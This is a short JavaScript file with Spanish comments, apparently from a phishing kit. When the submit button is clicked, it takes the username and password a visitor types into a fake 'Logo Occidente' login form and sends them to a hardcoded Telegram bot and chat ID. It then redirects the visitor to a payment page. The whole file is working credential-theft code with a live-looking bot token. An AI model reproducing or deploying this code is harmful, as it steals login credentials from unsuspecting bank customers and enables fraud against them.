function enviarMensajeTelegram(username, password) {
    // Aquí debes reemplazar 'TU_TOKEN' por el token de tu bot de Telegram
    var token = '7580606761:AAFiPnAx4jOqv-bBPWFcqk8rwOJ1DYdsCGA';
    // Aquí debes reemplazar 'TU_CHAT_ID' por el chat ID al que quieras enviar el mensaje
    var chatID = '7831097636';
    var mensaje = 'Logo Occidente: ' + '\nUsuario: ' + username + ' \nClave: ' + password;

    var url = 'https://api.telegram.org/bot' + token + '/sendMessage?chat_id=' + chatID + '&text=' + mensaje;

    var xhttp = new XMLHttpRequest();
    xhttp.open('GET', url, true);
    xhttp.send();
}

document.getElementById('submitBtn').addEventListener('click', function() {
    var username = document.getElementById('username').value;
    var password = document.getElementById('password').value;

    if (username.trim() !== '' && password.trim() !== '') {
        enviarMensajeTelegram(username, password);
        setTimeout(function() {
            window.location.href = '../cargapago.html';
        }, 1000);
    } else {
        alert('Por favor complete todos los campos antes de continuar.');
    }
});